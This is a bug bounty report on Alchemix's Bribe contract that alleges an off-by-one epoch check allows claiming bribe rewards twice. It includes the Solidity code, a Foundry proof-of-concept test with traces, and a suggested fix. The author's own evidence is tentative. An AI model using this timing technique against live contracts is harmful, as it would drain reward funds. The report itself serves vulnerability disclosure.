# 31542 - \[SC - Low] Bribeearned - L Its potentially possible to ear...

Submitted on May 21st 2024 at 04:19:40 UTC by @OxSCSamurai for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31542

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Contract fails to deliver promised returns, but doesn't lose value
* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

`Bribe::earned()` - L229: It's potentially possible to earn TWICE in an epoch due to a small logical oversight in `if (block.timestamp - _bribeStart(_startTimestamp) < DURATION) {`.

* In `if (block.timestamp - _bribeStart(_startTimestamp) < DURATION) {` the `DURATION` represents rewards released over a voting period of 2 weeks `uint256 internal constant DURATION = 2 weeks;`.

## Vulnerability Details

## Details:

* The duration is 2 weeks, which means 14 days, which means from beginning of day 1 to end of day 14. This is the duration period, or the epoch period. Things that shouldn't happen during the epoch or shouldn't happen more than once during the epoch should only happen AFTER the end of the 14th day, and not AT the end of the 14 day because AT the end of the 14th day or AT the end of week 2 the epoch is still technically active/valid, i.e. it is not AFTER the final second of the epoch end yet. Only after the epoch end should we claim rewards again, or do something for a "second" time.
* This is a common logical "mistake" seen in many protocols...
* Even in some of the protocol tests there is clear evidence of adding `1 seconds` to epoch durations during the testing phase, probably to bypass confusing/conflicting results. In my opinion, this due to using `<` in above line of code at L229, instead of `<=`.

Regardless, I hope to demonstrate with my PoC tests below that its actually possible to claim bribes TWICE during the same epoch, due to usage of `<` instead of `<=`. This is a complex topic in my opinion and I'm not insisting that I'm 100% correct, however, I am drawing attention to this matter because it requires 100% focus, attention, care and clarity to not make any mistakes. This isn't about off by 1 errors at all. Due to your currently implemented logic in your function, a user could potentially claim bribes twice for the same epoch...

Check my PoC test results where I demonstrate this.

## Function in question:

```solidity
    function earned(address token, uint256 tokenId) public view returns (uint256) {
        if (numCheckpoints[tokenId] == 0) {
            return 0;
        }

        uint256 _startTimestamp = lastEarn[token][tokenId];

        // Prevent earning twice within an epoch
        if (block.timestamp - _bribeStart(_startTimestamp) < DURATION) { /// @audit potential buggy line...
            return 0;
        }
        
        uint256 _startIndex = getPriorBalanceIndex(tokenId, _startTimestamp);
        uint256 _endIndex = numCheckpoints[tokenId] - 1;

        uint256 reward = 0;
        // you only earn once per epoch (after it's over)
        Checkpoint memory prevRewards; // reuse struct to avoid stack too deep
        prevRewards.timestamp = _bribeStart(_startTimestamp);
        uint256 _prevSupply = 1;

        if (_endIndex >= 0) {
            for (uint256 i = _startIndex; i <= _endIndex; i++) {
                Checkpoint memory cp0 = checkpoints[tokenId][i];
                uint256 _nextEpochStart = _bribeStart(cp0.timestamp);
                // check that you've earned it
                // this won't happen until a week has passed
                if (_nextEpochStart > prevRewards.timestamp) {
                    reward += prevRewards.balanceOf;
                }

                if (_startIndex == _endIndex) break; 

                prevRewards.timestamp = _nextEpochStart;
                _prevSupply = votingCheckpoints[getPriorVotingIndex(_nextEpochStart + DURATION)].votes;

                // Prevent divide by zero
                if (_prevSupply == 0) {
                    _prevSupply = 1;
                }
                prevRewards.balanceOf = (cp0.balanceOf * tokenRewardsPerEpoch[token][_nextEpochStart]) / _prevSupply;
            }
        }

        Checkpoint memory cp = checkpoints[tokenId][_endIndex];
        uint256 _lastEpochStart = _bribeStart(cp.timestamp);
        uint256 _lastEpochEnd = _lastEpochStart + DURATION;
        uint256 _priorSupply = votingCheckpoints[getPriorVotingIndex(_lastEpochEnd)].votes;

        // Prevent divide by zero
        if (_priorSupply == 0) {
            _priorSupply = 1;
        }

        if (block.timestamp > _lastEpochEnd) {
            reward += (cp.balanceOf * tokenRewardsPerEpoch[token][_lastEpochStart]) / _priorSupply;
        }

        return reward;
    }
```

## Impact Details

## IMPACT:

* Potential impact in scope: Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
* Alternative impact in scope: Contract fails to deliver promised returns, but doesn't lose value

Likelihood: low -- probably not easy to carry out, would need to use automated "attack" contract and get the timing precise down to the second...

Impact: medium - high -- malicious user/voter could leverage this to manipulate governance vote outcomes due to his unfair advantage in terms of collecting rewards... -- contract "loses" reward funds unexpectedly and under invalid conditions

Severity: low - medium

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/9e14da88d8db05794623d8ab5f449451a10c15ac/src/Bribe.sol#L229>

## Proof of Concept

## PoC:

Highly modified test function that I used:

```solidity
    function testBugBribeClaiming() public {
        // ------------------- Start first epoch i

        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        address bribeAddress = voter.bribes(address(sushiGauge));

        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        // in epoch i, admin votes
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);

        // ------------------- Start second epoch i+1
        //hevm.warp(newEpoch());
        hevm.warp(newEpoch() - 1 seconds); /// @audit added for PoC/testing purposes >>> `IMinter(minter).activePeriod() + IMinter(minter).DURATION() + 1 seconds;` >>> i subtracted 1 second to remove the error correction of protocol's testing phases
        uint256 blockTimestamp1 = block.timestamp; /// @audit added for PoC/testing purposes >>> this is now exactly at the start of the next epoch...
        voter.distribute();

        uint256 earnedBribes1 = IBribe(bribeAddress).earned(bal, tokenId1);
        assertEq(earnedBribes1, TOKEN_100K, "bribes from voting should be earned");

        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);

        assertEq(earnedBribes1, IERC20(bal).balanceOf(admin), "admin should receive bribes");

        // Add BAL bribes to sushiGauge /// @audit added for PoC/testing purposes
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K); /// @audit added for PoC/testing purposes
        hevm.prank(admin); /// @audit added for PoC/testing purposes
        voter.vote(tokenId1, pools, weights, 0); /// @audit added for PoC/testing purposes

        hevm.warp(blockTimestamp1 + 2 weeks); /// @audit added for PoC/testing purposes >>> this warps to exactly 2 weeks later after the start of the CURRENT epoch, so this should now be at the end of 14 days or 2 weeks, lets see if calculations agree with this assumption:
        uint256 blockTimestamp2 = block.timestamp; /// @audit added for PoC/testing purposes

        voter.distribute();
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);

        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);
        uint256 totalSecsPerEpoch = 2 weeks; /// @audit added for PoC/testing purposes >>> because an epoch is exactly 2 weeks
        assertEq(totalSecsPerEpoch, block.timestamp - blockTimestamp1); /// @audit added for PoC/testing purposes >>> to check if total secs in 1 epoch is equal to current timestamp - beginning of current/previous epoch?
        assertEq(blockTimestamp1, block.timestamp - totalSecsPerEpoch); /// @audit added for PoC/testing purposes >>> to check if total secs in 1 epoch is equal to current timestamp - beginning of current/previous epoch?
        assertGt(2 weeks + 1 seconds, blockTimestamp2 - blockTimestamp1); /// @audit added for PoC/testing purposes >>> effectively demonstrating that the current timestamp is not part of the next epoch, but still part of the current epoch which started exactly 2 weeks ago...
    }
```

### TEST 1: testing WITH the bug, to demonstrate how the user claims bribe rewards twice in the same epoch:

* check the assertions that I added at the end of the test function, where I attempted to prove that the second rewards claim happens DURING the same epoch as first claim...
* make file test command used: `make test_file_debug_test FILE=Voting TEST=testBugBribeClaiming`.
* please note that I wasnt sure how to get the "transfer amount exceeds balance" error to disappear, but I didnt need to, because this error message shows that the second attempt to claim bribe rewards was NOT prevented, otherwise this error message would not be possible...:

```solidity
$ make test_file_debug_test FILE=Voting TEST=testBugBribeClaiming
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/blahblahblah --match-path src/test/Voting.t.sol --match-test testBugBribeClaiming -vvvvv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/Voting.t.sol:VotingTest
[FAIL. Reason: revert: ERC20: transfer amount exceeds balance] testBugBribeClaiming() (gas: 4984079)
Traces:
  [41150687] VotingTest::setUp()
    ├─ [2656] 0xf16aEe6a71aF1A9Bc8F56975A4c2705ca7A782Bc::balanceOf(0x8392F6669292fA56123F71949B52d883aE57e225)
    │   └─ ← [Return] 0
.
.
.
.	deleted unnecessary test results
.
. 
    ├─ [7265] Bribe::earned(0xba100000625a3754423978a60c9317c58a424e3D, 1) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [0] VM::prank(0x8392F6669292fA56123F71949B52d883aE57e225)
    │   └─ ← [Return] 
    ├─ [112911] Voter::claimBribes([0xa2A4601B7243C89cD6F3EeC372570F3504527CDA], [[0xba100000625a3754423978a60c9317c58a424e3D]], 1)
    │   ├─ [1229] VotingEscrow::isApprovedOrOwner(0x8392F6669292fA56123F71949B52d883aE57e225, 1) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [108406] Bribe::getRewardForOwner(1, [0xba100000625a3754423978a60c9317c58a424e3D])
    │   │   ├─ [611] VotingEscrow::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x8392F6669292fA56123F71949B52d883aE57e225
    │   │   ├─ [29011] 0xba100000625a3754423978a60c9317c58a424e3D::transfer(0x8392F6669292fA56123F71949B52d883aE57e225, 100000000000000000000000 [1e23])
    │   │   │   ├─ emit Transfer(from: Bribe: [0xa2A4601B7243C89cD6F3EeC372570F3504527CDA], to: 0x8392F6669292fA56123F71949B52d883aE57e225, value: 100000000000000000000000 [1e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit ClaimRewards(from: 0x8392F6669292fA56123F71949B52d883aE57e225, reward: 0xba100000625a3754423978a60c9317c58a424e3D, amount: 100000000000000000000000 [1e23])
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [542] 0xba100000625a3754423978a60c9317c58a424e3D::balanceOf(0x8392F6669292fA56123F71949B52d883aE57e225) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
.
.
.
. 	deleted unnecessary test results
.
.
    ├─ [0] VM::prank(0x8392F6669292fA56123F71949B52d883aE57e225)
    │   └─ ← [Return] 
    ├─ [27132] Voter::claimBribes([0xa2A4601B7243C89cD6F3EeC372570F3504527CDA], [[0xba100000625a3754423978a60c9317c58a424e3D]], 1)
    │   ├─ [1229] VotingEscrow::isApprovedOrOwner(0x8392F6669292fA56123F71949B52d883aE57e225, 1) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [22740] Bribe::getRewardForOwner(1, [0xba100000625a3754423978a60c9317c58a424e3D])
    │   │   ├─ [611] VotingEscrow::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x8392F6669292fA56123F71949B52d883aE57e225
    │   │   ├─ [2902] 0xba100000625a3754423978a60c9317c58a424e3D::transfer(0x8392F6669292fA56123F71949B52d883aE57e225, 104255319148936170212765 [1.042e23])
    │   │   │   └─ ← [Revert] revert: ERC20: transfer amount exceeds balance
    │   │   └─ ← [Revert] revert: ERC20: transfer amount exceeds balance
    │   └─ ← [Revert] revert: ERC20: transfer amount exceeds balance
    └─ ← [Revert] revert: ERC20: transfer amount exceeds balance

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 72.44s (52.07s CPU time)

Ran 1 test suite in 76.25s (72.44s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in src/test/Voting.t.sol:VotingTest
[FAIL. Reason: revert: ERC20: transfer amount exceeds balance] testBugBribeClaiming() (gas: 4984079)

Encountered a total of 1 failing tests, 0 tests succeeded
make: *** [Makefile:74: test_file_debug_test] Error 1
```

* So it's pretty clear from the above test results that the function call tried to transfer bribe rewards to the user a SECOND time during the same epoch, but failed due to insufficient funds available. If your system checks for this worked 100% correctly, this step wouldn't even be reached...
* (Again, I wasnt sure how to make funds available quickly, didnt want to spend time on that, but that shouldnt be necessary anyway as this should suffice more than enough already...)
* So let me demonstrate with my bugfix that this above test result isnt even possible, the system doesnt even try to transfer bribe rewards to the user a second time during same epoch...

### TEST 2: now using the bugfix, to demonstrate that claiming of bribe rewards more than once during same epoch is now impossible / not possible:

* commented out the buggy code and inserted the bugfix into the function: Removed buggy line of code:

```solidity
if (block.timestamp - _bribeStart(_startTimestamp) < DURATION) {
```

Inserted bugfix:

```solidity
if (block.timestamp - _bribeStart(_startTimestamp) <= DURATION) {
```

#### Test result:

```solidity
$ make test_file_debug_test FILE=Voting TEST=testBugBribeClaiming
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/blahblahblah --match-path src/test/Voting.t.sol --match-test testBugBribeClaiming -vvvvv
[⠊] Compiling...
[⠰] Compiling 130 files with Solc 0.8.15
[⠒] Solc 0.8.15 finished in 7.33s
Compiler run successful with warnings:
.
.
.
.
.
. 
    ├─ [7262] Bribe::earned(0xba100000625a3754423978a60c9317c58a424e3D, 1) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [0] VM::prank(0x8392F6669292fA56123F71949B52d883aE57e225)
    │   └─ ← [Return] 
    ├─ [112908] Voter::claimBribes([0xa2A4601B7243C89cD6F3EeC372570F3504527CDA], [[0xba100000625a3754423978a60c9317c58a424e3D]], 1)
    │   ├─ [1229] VotingEscrow::isApprovedOrOwner(0x8392F6669292fA56123F71949B52d883aE57e225, 1) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [108403] Bribe::getRewardForOwner(1, [0xba100000625a3754423978a60c9317c58a424e3D])
    │   │   ├─ [611] VotingEscrow::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x8392F6669292fA56123F71949B52d883aE57e225
    │   │   ├─ [29011] 0xba100000625a3754423978a60c9317c58a424e3D::transfer(0x8392F6669292fA56123F71949B52d883aE57e225, 100000000000000000000000 [1e23])
    │   │   │   ├─ emit Transfer(from: Bribe: [0xa2A4601B7243C89cD6F3EeC372570F3504527CDA], to: 0x8392F6669292fA56123F71949B52d883aE57e225, value: 100000000000000000000000 [1e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit ClaimRewards(from: 0x8392F6669292fA56123F71949B52d883aE57e225, reward: 0xba100000625a3754423978a60c9317c58a424e3D, amount: 100000000000000000000000 [1e23])
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [542] 0xba100000625a3754423978a60c9317c58a424e3D::balanceOf(0x8392F6669292fA56123F71949B52d883aE57e225) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
.
.
.
.
.
. 
    ├─ [0] VM::prank(0x8392F6669292fA56123F71949B52d883aE57e225)
    │   └─ ← [Return] 
    ├─ [10374] Voter::claimBribes([0xa2A4601B7243C89cD6F3EeC372570F3504527CDA], [[0xba100000625a3754423978a60c9317c58a424e3D]], 1)
    │   ├─ [1229] VotingEscrow::isApprovedOrOwner(0x8392F6669292fA56123F71949B52d883aE57e225, 1) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [5985] Bribe::getRewardForOwner(1, [0xba100000625a3754423978a60c9317c58a424e3D])
    │   │   ├─ [611] VotingEscrow::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x8392F6669292fA56123F71949B52d883aE57e225
    │   │   └─ ← [Revert] revert: no rewards to claim
    │   └─ ← [Revert] revert: no rewards to claim
    └─ ← [Revert] revert: no rewards to claim

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 70.69s (51.92s CPU time)

Ran 1 test suite in 73.61s (70.69s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in src/test/Voting.t.sol:VotingTest
[FAIL. Reason: revert: no rewards to claim] testBugBribeClaiming() (gas: 4967312)

Encountered a total of 1 failing tests, 0 tests succeeded
make: *** [Makefile:74: test_file_debug_test] Error 1
```

* first claim was allowed, second claim attempt was blocked successfully.

### Final test: with bugfix, adding 1 second to the second time warp, which is the start of the next epoch, so it should allow claiming of "second" bribe reward now:

* `hevm.warp(blockTimestamp1 + 2 weeks + 1 seconds);` Test result:

```solidity
$ make test_file_debug_test FILE=Voting TEST=testBugBribeClaiming
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/blahblahblah --match-path src/test/Voting.t.sol --match-test testBugBribeClaiming -vvvvv
[⠊] Compiling...
[⠰] Compiling 130 files with Solc 0.8.15
[⠔] Solc 0.8.15 finished in 7.28s
Compiler run successful with warnings:
.
.
.
.
.
.
. 
    ├─ [7262] Bribe::earned(0xba100000625a3754423978a60c9317c58a424e3D, 1) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [0] VM::prank(0x8392F6669292fA56123F71949B52d883aE57e225)
    │   └─ ← [Return] 
    ├─ [112908] Voter::claimBribes([0xa2A4601B7243C89cD6F3EeC372570F3504527CDA], [[0xba100000625a3754423978a60c9317c58a424e3D]], 1)
    │   ├─ [1229] VotingEscrow::isApprovedOrOwner(0x8392F6669292fA56123F71949B52d883aE57e225, 1) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [108403] Bribe::getRewardForOwner(1, [0xba100000625a3754423978a60c9317c58a424e3D])
    │   │   ├─ [611] VotingEscrow::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x8392F6669292fA56123F71949B52d883aE57e225
    │   │   ├─ [29011] 0xba100000625a3754423978a60c9317c58a424e3D::transfer(0x8392F6669292fA56123F71949B52d883aE57e225, 100000000000000000000000 [1e23])
    │   │   │   ├─ emit Transfer(from: Bribe: [0xa2A4601B7243C89cD6F3EeC372570F3504527CDA], to: 0x8392F6669292fA56123F71949B52d883aE57e225, value: 100000000000000000000000 [1e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit ClaimRewards(from: 0x8392F6669292fA56123F71949B52d883aE57e225, reward: 0xba100000625a3754423978a60c9317c58a424e3D, amount: 100000000000000000000000 [1e23])
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [542] 0xba100000625a3754423978a60c9317c58a424e3D::balanceOf(0x8392F6669292fA56123F71949B52d883aE57e225) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
.
.
.
.
.
. 
    ├─ [0] VM::prank(0x8392F6669292fA56123F71949B52d883aE57e225)
    │   └─ ← [Return] 
    ├─ [31981] Voter::claimBribes([0xa2A4601B7243C89cD6F3EeC372570F3504527CDA], [[0xba100000625a3754423978a60c9317c58a424e3D]], 1)
    │   ├─ [1229] VotingEscrow::isApprovedOrOwner(0x8392F6669292fA56123F71949B52d883aE57e225, 1) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [27476] Bribe::getRewardForOwner(1, [0xba100000625a3754423978a60c9317c58a424e3D])
    │   │   ├─ [611] VotingEscrow::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x8392F6669292fA56123F71949B52d883aE57e225
    │   │   ├─ [5111] 0xba100000625a3754423978a60c9317c58a424e3D::transfer(0x8392F6669292fA56123F71949B52d883aE57e225, 100000000000000000000000 [1e23])
    │   │   │   ├─ emit Transfer(from: Bribe: [0xa2A4601B7243C89cD6F3EeC372570F3504527CDA], to: 0x8392F6669292fA56123F71949B52d883aE57e225, value: 100000000000000000000000 [1e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit ClaimRewards(from: 0x8392F6669292fA56123F71949B52d883aE57e225, reward: 0xba100000625a3754423978a60c9317c58a424e3D, amount: 100000000000000000000000 [1e23])
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 67.81s (50.45s CPU time)

Ran 1 test suite in 70.42s (67.81s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

* user able to successfully claim bribe rewards a second time but only in next epoch, as intended and expected.

## Suggested bugfix:

```diff
        // Prevent earning twice within an epoch
-       if (block.timestamp - _bribeStart(_startTimestamp) < DURATION) {
+       if (block.timestamp - _bribeStart(_startTimestamp) <= DURATION) {
            return 0;
        }
```
